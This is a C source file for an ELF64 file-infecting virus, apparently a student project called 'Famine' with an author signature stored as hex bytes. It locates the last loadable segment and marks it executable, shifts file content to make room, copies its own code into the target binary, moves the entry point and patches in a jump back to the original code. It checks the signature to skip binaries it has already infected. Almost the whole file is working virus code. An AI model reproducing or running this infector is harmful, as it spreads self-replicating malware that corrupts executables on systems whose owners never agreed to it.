#include "virus.h"

#define CODE_SZ 0x1000

void zeEnd();

void setHeaders(struct sheaders64 *sHdrs, struct pheaders64 *pHdrs, struct ELFheaders64 *fHdr, int last_load_seg, int last_load_sec) {
    fHdr->e_entry = pHdrs[last_load_seg].p_paddr + pHdrs[last_load_seg].p_memsz + 0x42;
    fHdr->e_shoff += CODE_SZ + (pHdrs[last_load_seg].p_memsz - pHdrs[last_load_seg].p_filesz);

    sHdrs[last_load_sec].sh_size += CODE_SZ;
    sHdrs[last_load_sec].sh_type = SHT_PROGBITS;
    sHdrs[fHdr->e_shstrndx].sh_offset += CODE_SZ + (pHdrs[last_load_seg].p_memsz - pHdrs[last_load_seg].p_filesz);

    pHdrs[last_load_seg].p_memsz += CODE_SZ;
    pHdrs[last_load_seg].p_filesz = pHdrs[last_load_seg].p_memsz;
    pHdrs[last_load_seg].p_flags |= PF_X;
}

void CleanPayloadAreaAndShiftFileContent(int fd, struct pheaders64 *pHdrs, int last_load_seg) {
    unsigned char tmp[0x3000];

    ft_syscall((void *)fd, (void *)(pHdrs[last_load_seg].p_offset + pHdrs[last_load_seg].p_filesz), 0, 0, LSEEK);
    unsigned long int bytes = ft_syscall((void *)fd, (void *)tmp, (void *)0x3000, 0, READ);

    unsigned long int decalage = CODE_SZ + pHdrs[last_load_seg].p_memsz;
    ft_syscall((void *)fd, (void *)(pHdrs[last_load_seg].p_offset + decalage), 0, 0, LSEEK);
    ft_syscall((void *)fd, (void *)tmp, (void *)bytes, 0, WRITE);

    for (int i = 0; i < 0x3000; i++)
        tmp[i] = 0;
    ft_syscall((void *)fd, (void *)(pHdrs[last_load_seg].p_offset + pHdrs[last_load_seg].p_filesz), 0, 0, LSEEK);
    ft_syscall((void *)fd, (void *)tmp, (void *)(decalage - pHdrs[last_load_seg].p_filesz) , 0, WRITE);
}

void    change_program_header(int fd, struct sheaders64 *sHdrs, struct pheaders64 *pHdrs, struct ELFheaders64 fHdr) {
    ft_syscall((void *)fd, (void *)0, 0, 0, LSEEK);
    ft_syscall((void *)fd, (void *)&fHdr, (void *)0x40, 0, WRITE);
    ft_syscall((void *)fd, (void *)fHdr.e_phoff, 0, 0, LSEEK);
    ft_syscall((void *)fd, (void *)pHdrs, (void *)(fHdr.e_phnum * fHdr.e_phentsize), 0, WRITE);
    ft_syscall((void *)fd, (void *)fHdr.e_shoff, 0, 0, LSEEK);
    ft_syscall((void *)fd, (void *)sHdrs, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0, WRITE);
}

void addJump(int fd, unsigned long position, long unsigned int offset) {
    unsigned char jmp_code[] = {0xE9};

    offset -= 4;
    ft_syscall((void *)fd, (void *)(position + 0x74), 0, 0, LSEEK);
    ft_syscall((void *)fd, (void *)jmp_code, (void *)sizeof(jmp_code), 0, WRITE);
    ft_syscall((void *)fd, (void *)&offset, (void *)4, 0, WRITE);
}

void insertCode(int fd, struct pheaders64 *pHdrs, struct ELFheaders64 *fHdr, int last_load_seg) {
    unsigned int len = (unsigned long)&zeEnd - (unsigned long)&_start;
    CleanPayloadAreaAndShiftFileContent(fd, pHdrs, last_load_seg);

    ft_syscall((void *)fd, (void *)(pHdrs[last_load_seg].p_offset + pHdrs[last_load_seg].p_memsz), 0, 0, LSEEK);
    ft_syscall((void *)fd, (void *)&_start, (void *)len, 0, WRITE);
    addJump(fd, pHdrs[last_load_seg].p_offset + pHdrs[last_load_seg].p_memsz, fHdr->e_entry - (pHdrs[last_load_seg].p_paddr + pHdrs[last_load_seg].p_memsz + len));
}

unsigned long int    writeFile(int fd, struct ELFheaders64 fHdr) {
    const char signature[] = { 0x46, 0x61, 0x6d, 0x69, 0x6e, 
                            0x65, 0x20, 0x76, 0x65, 0x72, 
                            0x73, 0x69, 0x6f, 0x6e, 0x20, 
                            0x31, 0x2e, 0x30, 0x20, 0x28, 
                            0x63, 0x29, 0x6f, 0x64, 0x65, 
                            0x64, 0x20, 0x62, 0x79, 0x20, 
                            0x3c, 0x70, 0x67, 0x6f, 0x75, 
                            0x64, 0x65, 0x74, 0x3e, 0x2d, 
                            0x3c, 0x4d, 0x61, 0x73, 0x74, 
                            0x65, 0x72, 0x6d, 0x69, 0x6e, 
                            0x64, 0x20, 0x70, 0x67, 0x6f, 
                            0x75, 0x64, 0x65, 0x74, 0x3e };
    struct sheaders64 sHdrs[fHdr.e_shnum];
    struct pheaders64 pHdrs[fHdr.e_phnum];
    int last_load_seg;
    int last_load_sec;

    ft_syscall((void *)1, (void *)"\nthis is a test\n", (void *)17, 0, WRITE);

    if (checkSignature(fd, signature) == 1)
        return (1);
    ft_syscall((void *)1, (void *)"this is a test3\n", (void *)16, 0, WRITE);
    
    ft_syscall((void *)fd, (void *)fHdr.e_shoff, 0, 0, LSEEK);
    ft_syscall((void *)fd, (void *)sHdrs, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0, READ);
    ft_syscall((void *)fd, (void *)fHdr.e_phoff, 0, 0, LSEEK);
    ft_syscall((void *)fd, (void *)pHdrs, (void *)(fHdr.e_phnum * fHdr.e_phentsize), 0, READ);
    last_load_seg = get_last_load_segment(pHdrs, fHdr);
    last_load_sec = findLastLoadSection(sHdrs, fHdr, pHdrs[last_load_seg]);

    if (increaseFileSize(fd, fHdr, sHdrs) == 1)
        return (0);
    insertCode(fd, pHdrs, &fHdr, last_load_seg);
    setHeaders(sHdrs, pHdrs, &fHdr, last_load_seg, last_load_sec);
    change_program_header(fd, sHdrs, pHdrs, fHdr);
    return (0);
}

void zeEnd(){}